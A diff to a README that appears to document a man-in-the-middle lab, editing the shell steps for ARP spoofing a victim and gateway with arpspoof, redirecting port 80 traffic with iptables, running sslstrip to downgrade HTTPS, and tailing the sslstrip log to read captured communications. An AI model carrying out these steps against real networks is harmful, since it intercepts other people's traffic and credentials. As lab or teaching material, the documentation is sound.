@@ -40,13 +40,13 @@ sudo mitmweb --mode transparent --showhost -p <PORT TO LISTEN>
 - To perform the arpspoofing
 
 ```sh
-sudo arpspoof <INTERFACE> eth1 -t <VICTIM IP> <GATEWAY IP>
+$ sudo arpspoof <INTERFACE> eth1 -t <VICTIM IP> <GATEWAY IP>
 ```
 
 - Iptables rules to forward the traffic
 
 ```sh
-sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port <PORT TO LISTEN>
+$ sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port <PORT TO LISTEN>
 ```
 - Edit ` /etc/sysctl.conf` and add the following lines
 
@@ -61,7 +61,11 @@ After that, execute `sudo sysctl -p` to reload the file
 - Follow the steps on https://github.com/juanelas/sslstrip to install the `sslstrip` tool. Then climb to `sslstrip` directory and execute
 
 ```sh
-sslstrip -l <PORT TO LISTEN>
+$ sslstrip -l <PORT TO LISTEN>
+```
+- To see the content of the comunications
+```sh
+$ tail -f sslstrip.log
 ```
 
 ### Victim's machine
